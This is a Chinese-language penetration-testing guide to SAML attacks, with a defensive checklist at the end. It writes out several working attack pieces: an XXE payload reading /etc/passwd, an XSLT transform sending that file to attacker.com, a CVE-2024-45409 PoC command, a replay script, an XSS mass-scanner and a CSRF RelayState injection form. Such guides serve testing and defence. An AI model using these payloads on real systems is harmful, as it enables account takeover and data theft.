---
attack_surface: [认证/授权绕过, 注入类, 客户端利用, 密码学误用, 配置缺陷]
impact: [身份伪造, 权限提升, 机密性破坏, 信息泄露, 远程代码执行]
risk_level: 严重
prerequisites:
  - XML 基础与 XML Signature 概念
  - SAML 2.0 协议理解
  - Burp Suite 拦截代理操作
related_techniques:
  - oauth-to-account-takeover
  - xxe-xml-external-entity
  - xslt-server-side-injection
  - xss-cross-site-scripting
  - crlf-injection
difficulty: 高级
tools:
  - Burp Suite + SAML Raider
  - SAMLExtractor
  - SAML-tracer (browser extension)
---

# SAML Attacks — SAML 安全断言标记语言攻击全指南

> 关联文档：[OAuth to Account Takeover](../OAUTH%20to%20Account%20takeover/README.md) · [XXE](../../User%20input/Reflected%20Values/XXE/README.md) · [XSLT Injection](../../User%20input/Reflected%20Values/XSLT/README.md) · [XSS](../../User%20input/Reflected%20Values/XSS/README.md) · [CRLF Injection](../../User%20input/Reflected%20Values/CRLF/README.md)

---

# 0x01 SAML 基础与攻击面概览

## 1.0 TL;DR

Security Assertion Markup Language (SAML) 是企业 SSO 的基石协议。与 OAuth 不同，SAML 基于 XML 而非 JSON——这一设计选择使其暴露于 XML 特有的攻击面：签名包装（XSW）、XML 往返解析差异、XXE、XSLT 注入。SAML 的根本安全悖论是：**签名验证和应用逻辑消费的是同一 XML 文档的不同解析结果**——任何解析差异都是完整性的裂缝。

## 1.1 SAML vs OAuth

| 维度 | SAML | OAuth 2.0 |
|------|------|----------|
| 数据格式 | XML | JSON |
| 设计目标 | 企业 SSO 登录安全 | 移动端友好、授权委托 |
| 签名机制 | XML Signature (DSig) | JWT / HMAC |
| 主要攻击面 | XML 解析差异、签名包装 | redirect_uri 绕过、state 缺陷 |
| 会话传递 | SAML Assertion → SP Session | Access Token → API 调用 |

## 1.2 SAML 认证流程

```
1. 用户 → SP: 尝试访问受保护资源
2. SP → 浏览器: 生成 SAML Request，302 重定向至 IdP
3. 浏览器 → IdP: 转发 SAML Request（Deflate + Base64）
4. IdP: 认证用户身份
5. IdP → 浏览器: 生成 SAML Response，302 重定向至 SP 的 ACS URL
6. 浏览器 → SP ACS: POST SAMLResponse + RelayState
7. SP ACS: 验证签名 → 提取 Assertion → 建立 Session
8. SP → 用户: 授予资源访问权限
```

## 1.3 SAML Request/Response 关键元素

### SAML Request

```xml
<?xml version="1.0"?>
<samlp:AuthnRequest
  AssertionConsumerServiceURL="https://sp.example.com/acs"
  Destination="https://idp.example.com/auth"
  ProtocolBinding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST"
  ID="_abc123" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <saml:Issuer>https://sp.example.com</saml:Issuer>
</samlp:AuthnRequest>
```

### SAML Response 关键组件

| 元素 | 作用 |
|------|------|
| `ds:Signature` | XML 签名，确保完整性与来源认证 |
| `saml:Assertion` | 用户身份信息和属性 |
| `saml:Subject` | Assertion 的主体（用户标识） |
| `saml:SubjectConfirmationData` | 包含 `Recipient` 字段，指定目标 SP URL |
| `saml:Conditions` | 有效期 (`NotBefore`/`NotOnOrAfter`) 和 `AudienceRestriction` |
| `saml:AuthnStatement` | 认证方式与时间 |
| `saml:AttributeStatement` | 用户属性（邮箱、角色、组成员） |

## 1.4 XML 签名类型

XML Signatures 可签署整个 XML 树或特定元素。三种基本类型：

```xml
<!-- 1. Enveloped Signature — 签名是所签署资源的后代 -->
<samlp:Response ID="abc">
  <ds:Signature>
    <ds:Reference URI="#abc">
      <ds:Transform><...enveloped-signature.../></ds:Transform>
    </ds:Reference>
  </ds:Signature>
</samlp:Response>

<!-- 2. Enveloping Signature — 签名包裹所签署资源 -->
<ds:Signature>
  <ds:Reference URI="#abc"/>
  <samlp:Response ID="abc">...</samlp:Response>
</ds:Signature>

<!-- 3. Detached Signature — 签名与内容分离 -->
<samlp:Response ID="abc">...</samlp:Response>
<ds:Signature>
  <ds:Reference URI="#abc"/>
</ds:Signature>
```

## 1.5 SAML 攻击面全景图

```
                        SAML 攻击面
                              │
    ┌────────────┬─────────────┼─────────────┬────────────┐
    │            │             │             │            │
  XML 结构   签名验证        传输层         应用逻辑     注入
    │            │             │             │            │
  XSW #1-8   Signature      Token         XSS in       XXE
  XML Round-  Exclusion      Recipient     Logout       XSLT
  Trip        伪造证书       Confusion     RelayState   via SAML
              CVE-2024-45409               rXSS         CRLF
```

---

# 0x02 XML Signature Wrapping (XSW) 攻击

## 2.1 原理

XSW 攻击利用 XML 文档处理的两个独立阶段——**签名验证**和**业务逻辑处理**——之间的差异。攻击者注入伪造元素到 XML 结构中，使得：

- **签名验证模块**看到的元素与原签名匹配 → 验证通过
- **应用逻辑**处理的元素是攻击者注入的版本 → 身份伪造

关键在于：XML 解析器在面对结构歧义时（多个同名元素、不同层级、不同顺序），其遍历规则和签名验证器使用相同的 XML 但得出不同结论。

## 2.2 XSW 变体全矩阵

### XSW #1 — 新根元素包裹

```
策略: 在原始 Response 外包裹一个新根元素，新根含伪造 Assertion
结构: [copied Response [Signature over original Assertion]] + [evil Assertion]
利用: 验证器找到被签名的原始 Assertion（通过），应用逻辑找第一个 Assertion（攻击者控制）
```

### XSW #2 — Detached 签名变体

与 XSW #1 结构相同，但使用 Detached Signature 而非 Enveloping Signature。

### XSW #3 — 同级伪造 Assertion

```
策略: 在与原始 Assertion 同一层级注入伪造 Assertion
结构: [Response [original Assertion] [evil Assertion]] [Signature over original]
利用: 应用逻辑遍历 Assertion 子元素时，可能取第一个或最后一个
```

### XSW #4 — Assertion 篡位

```
策略: 原始 Assertion 变为伪造 Assertion 的子元素
结构: [Response [evil Assertion [original Assertion]]] [Signature over original]
利用: 应用逻辑找最外层 Assertion → 攻击者控制
```

### XSW #5 — 非标准签名位置

```
策略: 签名不在标准位置（不属于 enveloped/enveloping/detached 任一类）
结构: 伪造 Assertion 包裹 Signature，Signature 包裹原始 Assertion
利用: 签名验证器无法正确定位签名上下文
```

### XSW #6 — 嵌套欺骗

```
策略: 与 XSW #4/#5 类似但使用更复杂的嵌套
结构: [evil Assertion [Signature [original Assertion]]]
利用: 三重嵌套使验证逻辑与应用逻辑的偏差最大化
```

### XSW #7 — Extensions 元素注入

```
策略: 利用 Extensions 元素的宽松 Schema，在其中嵌入伪造 Assertion
结构: [Response [Extensions [evil Assertion]] [original Assertion]] [Signature]
利用: OpenSAML 等库对 Extensions 的 Schema 验证较宽松
```

### XSW #8 — 反向 Extensions

```
策略: XSW #7 的变体，原始 Assertion 成为宽松元素的子元素
结构: [Response [less-restrictive-element [original Assertion]] [evil Assertion]]
利用: 应用逻辑可能遍历 less-restrictive-element 外的 Assertion
```

### XSW 攻击工具

使用 Burp 扩展 [SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) 可自动应用所有 8 种 XSW 变体。

---

# 0x03 XML Round-Trip 攻击

## 3.1 原理

XML 往返（Round-Trip）攻击的核心是：**签名验证时的 XML 与签名后被应用消费的 XML 不是同一个文档**。在签名与消费之间，XML 经过"解析 → 序列化 → 再解析"的过程。如果序列化/再解析改变了 XML 结构（如注释、CDATA、实体解析的语义变化），签名的完整性保证就被打破。

[Mattermost 研究](https://mattermost.com/blog/securing-xml-implementations-across-the-web/) 详细分析了此漏洞类。

## 3.2 REXML 案例

Ruby REXML ≤ 3.2.4 在往返后的 XML 结构与原始不同：

```ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
  <Y/><![CDATA[--><X><Z/><!--]]]>
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
# 输出: First child in original doc: Y

doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
# 输出: First child after round-trip: Z ← 结构已变化!
```

**攻击链**：

1. 构造一个合法的 SAML Response，签名覆盖 `<Y/>` 作为第一个子元素
2. 利用 DOCTYPE/CDATA 混淆使往返后的 XML 中 `<Z/>` 成为第一个子元素
3. 应用逻辑取第一个子元素 = `<Z/>`（攻击者控制），签名验证检查的是 `<Y/>`（合法）
4. 签名有效，但应用消费的是攻击者注入的内容 → ATO

---

# 0x04 签名验证绕过

## 4.1 Ruby-SAML 签名验证绕过 (CVE-2024-45409)

**影响**：如果 Service Provider 使用存在漏洞的 Ruby-SAML 库（如 GitLab SAML SSO），攻击者获取任意 IdP 签名的 SAMLResponse 后，可**伪造新的 Assertion** 并以任意用户身份认证。

**攻击流程**：

1. 在 SSO POST 中捕获一个**合法的 SAMLResponse**（Burp 或浏览器 devtools）
2. 解码传输编码为原始 XML：**URL 解码 → Base64 解码 → Raw Inflate**
3. 使用 PoC 脚本**修补 ID/NameID/Conditions**，**重写签名引用/摘要**使验证通过但 SP 消费攻击者控制的断言字段
4. 重新编码修补后的 XML：**Raw Deflate → Base64 → URL 编码**
5. 重放到 SAML 回调端点 → 以选定用户身份登录

```bash
python3 CVE-2024-45409.py -r response.url_base64 -n admin@example.com -o response_patched.url_base64
```

## 4.2 XML Signature Exclusion

当 SAML Response 中**Signature 元素完全缺失**时，部分实现跳过签名验证直接信任内容：

```
原始: [Response [Assertion] [Signature over Assertion]]
攻击: [Response [Assertion with modified Subject]]  ← 移除整个 Signature
```

使用 SAML Raider 的 `Remove Signatures` 按钮即可测试。如果 SP 仍接受未签名的 Response → 可任意篡改用户身份和属性。

## 4.3 Certificate Faking

测试 SP 是否**正确验证 SAML Message 由受信任的 IdP 签名**——而非仅验证"有签名"：

1. 拦截 SAML Response
2. 在 SAML Raider 中导入原始证书 → `Save and Self-Sign` 创建自签名副本
3. 移除现有签名 → 用自签名证书重新签名
4. 转发请求 → 如果认证成功 → SP 接受任意自签名证书 → ATO

---

# 0x05 Token Recipient Confusion

## 5.1 原理

Token Recipient Confusion（SAML-TRC）检查 SP 是否正确验证响应的**目标接收者**。`SubjectConfirmationData` 中的 `Recipient` 字段指定了 Assertion 应发送到的 URL。如果 SP-Target 不验证 `Recipient` 是否与自己匹配，则针对 SP-Legit 签发的 Assertion 可被重放到 SP-Target。

**前置条件**：
- 存在一个 SP-Legit（攻击者在此有合法账户）
- SP-Target 接受来自同一 IdP 的 Token
- SP-Target 不验证 `Recipient` 字段

## 5.2 攻击流程

```
1. 攻击者用自己账户通过 IdP 登录 SP-Legit
2. 拦截 IdP → SP-Legit 的 SAML Response
3. 将 SAML Response 重放至 SP-Target 的 ACS URL
4. SP-Target 验证签名（来自受信任 IdP）→ 通过
5. SP-Target 未检查 Recipient 字段 → 接受 Assertion
6. 攻击者以同一用户名登录 SP-Target → ATO
```

```python
# 重放 SAML Response 到不同 SP
import requests

def replay_saml(saml_response, target_acs):
    r = requests.post(target_acs, data={
        "SAMLResponse": saml_response,
        "RelayState": ""
    }, allow_redirects=True)
    return r.status_code, r.cookies
```

---

# 0x06 XXE via SAML

## 6.1 原理

SAML Response 是经过 Deflate + Base64 编码的 XML 文档——底层仍然是 XML。如果在 SAML 处理的 XML 解析阶段未禁用外部实体，攻击者可以注入 XXE Payload 读取服务器文件或发起 SSRF。

**关键**：XXE 在签名验证之前触发——即使签名无效，实体解析已完成。

## 6.2 Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY file SYSTEM "file:///etc/passwd">
  <!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
  <saml:Issuer>...</saml:Issuer>
  <ds:Signature ...>
    <ds:SignedInfo>
      <ds:CanonicalizationMethod .../>
      <ds:SignatureMethod .../>
      <ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
    </ds:SignedInfo>
    <ds:SignatureValue>...</ds:SignatureValue>
  </ds:Signature>
  ...
```

使用 SAML Raider 可从 SAML Request 自动生成 XXE 测试 POC。

---

# 0x07 XSLT via SAML

## 7.1 原理

XSLT（Extensible Stylesheet Language Transformations）用于将 XML 转换为 HTML/JSON/PDF。关键事实：**XSLT 转换在数字签名验证之前执行**。这意味着即使使用自签名或无效签名，XSLT 注入 Payload 仍会执行。

XSLT 可调用 `unparsed-text()` 读取文件系统、`document()` 发起 SSRF、甚至在某些实现中执行系统命令。

## 7.2 Payload

```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
  ...
    <ds:Transforms>
      <ds:Transform>
        <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
          <xsl:template match="doc">
            <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
            <xsl:variable name="escaped" select="encode-for-uri($file)"/>
            <xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
            <xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
            <xsl:value-of select="unparsed-text($exploitUrl)"/>
          </xsl:template>
        </xsl:stylesheet>
      </ds:Transform>
    </ds:Transforms>
  ...
</ds:Signature>
```

使用 SAML Raider 可从 SAML Request 自动生成 XSLT 测试 POC。

## 7.3 高级攻击：XML Signature Transform 链 → RCE

Felix Wilhelm（Google Project Zero）在 HEXACON 2022 上展示了如何通过 XML Signature 的 Transform 链在 Java SAML 实现中实现完整 RCE [视频](https://www.youtube.com/watch?v=WHn-6xHL7mI)：

1. **Transform 链是攻击者控制的代码路径**：`ds:Reference` 中的 Transforms 在签名验证前执行，且支持 XPath 过滤、base64 解码、XSLT 等任意变换
2. **参考验证顺序缺陷**：若 SP 在验证签名密钥可信性之前先执行 Reference Validation（这是 RFC 推荐顺序），则整个 Transform 链由攻击者完全控制
3. **Java 利用链**：XSLT Transform → 生成恶意 Java 字节码 → 利用 OpenJDK 类加载器缺陷 → `Runtime.exec()` RCE
4. **多租户威胁模型变化**：在传统企业中 IdP 是可信的，但在现代 SaaS 多租户环境下，SP 必须防范恶意 IdP——任何允许用户自配置 IdP 的应用都将此攻击面暴露给外部攻击者

---

# 0x08 SAML 中的客户端攻击

## 8.1 XSS in Logout Functionality

来自 [Uber 子域名 XSS 报告](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)：SAML SSO logout 端点中的 `base` 参数接受任意 URL。

```
# 正常行为
https://target.com/oidauth/prompt?base=https://target.com&return_to=/

# 注入 javascript: scheme
https://target.com/oidauth/prompt?base=javascript:alert(123)//

→ 浏览器将 base 参数值用于重定向 → XSS 执行
```

### 批量利用

使用 [SAMLExtractor](https://github.com/fadyosman/SAMLExtractor) 提取所有使用同一 SSO 库的子域名，然后批量测试 OIDC/SAML prompt 端点的参数反射：

```python
import requests

with open("saml_domains.txt") as urlList:
    for url in urlList:
        test_url = url.strip().split("oidauth")[0] + \
                   "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2F&return_to=/"
        request = requests.get(test_url, allow_redirects=True, verify=False)
        if "alert(123)" in request.text:
            print(f"[VULNERABLE] {test_url}")
```

## 8.2 RelayState Header/Body Injection → rXSS

部分 SAML SSO 端点解码 `RelayState` 后将其**未转义地反射到 HTTP 响应中**。如果 RelayState 包含换行符，攻击者可以覆盖响应 `Content-Type` 并注入 HTML：

```text
# 注入序列
\n
Content-Type: text/html


<svg/onload=alert(1)>
```

编码链：**原始注入序列 → URL 编码 → Base64 编码 → 放入 RelayState**

```http
POST /cgi/logout HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

SAMLResponse=[BASE64-Generic-SAML-Response]&RelayState=DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KDQoNCjxzdmcvb25sb2FkPWFsZXJ0KDEpPg==
```

CSRF 交付模式：

```html
<form action="https://target/cgi/logout" method="POST" id="p">
  <input type="hidden" name="SAMLResponse" value="[BASE64]">
  <input type="hidden" name="RelayState" value="DQpDb250ZW50LVR5cGU6...">
</form>
<script>document.getElementById('p').submit()</script>
```

**适用场景**：Citrix NetScaler SSO 端点 (`/cgi/logout`) — 详见 [CVE-2025-12101](https://labs.watchtowr.com/is-it-citrixbleed4-well-no-is-it-good-also-no-citrix-netscalers-memory-leak-rxss-cve-2025-12101/)。

---

# 0x09 防御策略

## 9.1 SAML 安全实现清单

| 组件 | 要求 |
|------|------|
| XML 解析器 | 禁用外部实体（DTD/ENTITY）、禁用 XSLT 扩展函数 |
| 签名验证 | **必须先验签后消费**：在签名验证通过之前不访问 Assertion 的任何内容 |
| Schema 验证 | 强制 Schema 验证，限制允许的 XML 结构（拒绝额外 Assertion/Extensions 注入） |
| XSW 防护 | 使用精确的元素选择器（如 XPath `//saml:Assertion[@ID=$ref]`）而非 `first()` 遍历 |
| Recipient 验证 | `SubjectConfirmationData` 的 `Recipient` 必须**精确匹配** ACS URL |
| Audience 限制 | `AudienceRestriction` 必须包含当前 SP 的 Entity ID |
| 证书信任 | 仅信任预配置的 IdP 证书，拒绝自签名/非信任证书 |
| XML 解析器一致性 | 使用单一 XML 解析器完成签名验证和应用消费，消除往返差异 |
| 签名存在性 | 拒绝任何缺少 Signatures 的 SAML 消息（强制签名） |
| RelayState | 编码前验证、限制字符集、输出编码——拒绝换行符 |
| 时间窗口 | Assertion `NotOnOrAfter` 限制为 ≤ 5 分钟 |

## 9.2 SAML 测试清单

- [ ] SP 是否强制要求 SAML Response / Assertion 签名？
- [ ] 移除签名元素后 SP 是否仍接受？
- [ ] 用自签名证书替换后 SP 是否验证证书链？
- [ ] XSW #1-#8：每种变形是否被检测并拒绝？
- [ ] XML 解析器是否禁用外部实体？（XXE 测试）
- [ ] `ds:Transform` 中是否接受 XSLT 样式表？
- [ ] `Recipient` 字段是否被验证并精确匹配？
- [ ] `AudienceRestriction` 是否包含当前 SP Entity ID？
- [ ] Assertion TTL 是否 ≤ 5 分钟？
- [ ] 已使用的 Assertion 是否被缓存拒绝重放？
- [ ] SAML SSO logout 端点的参数是否存在 XSS 反射？
- [ ] `RelayState` 是否可注入换行符/HTML？
- [ ] `SubjectConfirmationData` 中是否缺少 `InResponseTo` 校验？

---

## 参考资料

- [Epi052 — How to Test SAML: A Methodology (Part 1)](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
- [Epi052 — How to Test SAML: A Methodology (Part 2 — XSW)](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)
- [Epi052 — How to Test SAML: A Methodology (Part 3)](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
- [Mattermost — Securing XML Implementations Across the Web](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
- [Joonas — SAML is Insecure by Design](https://joonas.fi/2021/08/saml-is-insecure-by-design/)
- [USENIX 2012 — On Breaking SAML: Be Whoever You Want to Be](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf)
- [CVE-2024-45409 — Ruby-SAML Signature Verification Bypass (Synacktiv PoC)](https://github.com/synacktiv/CVE-2024-45409)
- [Ruby-SAML Security Advisory GHSA-jw9c-mfg7-9rx2](https://github.com/SAML-Toolkits/ruby-saml/security/advisories/GHSA-jw9c-mfg7-9rx2)
- [Fady Othman — XSS Affecting 20+ Uber Subdomains via SAML Logout](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)
- [watchTowr — Citrix NetScaler rXSS CVE-2025-12101 via RelayState](https://labs.watchtowr.com/is-it-citrixbleed4-well-no-is-it-good-also-no-citrix-netscalers-memory-leak-rxss-cve-2025-12101/)
- [0xdf — HTB Barrier SAML Walkthrough](https://0xdf.gitlab.io/2026/03/03/htb-barrier.html)
- [SAML Raider — Burp Extension](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)
- [SAMLExtractor — GitHub Tool](https://github.com/fadyosman/SAMLExtractor)
- [HEXACON 2022 — Hacking the Cloud with SAML (Felix Wilhelm, Google Project Zero)](https://www.youtube.com/watch?v=WHn-6xHL7mI) — 深入分析 XML Signature Transform 链如何在 Java SAML 实现中导致 RCE，揭示多租户 SaaS 环境下恶意 IdP 攻击面的关键研究成果
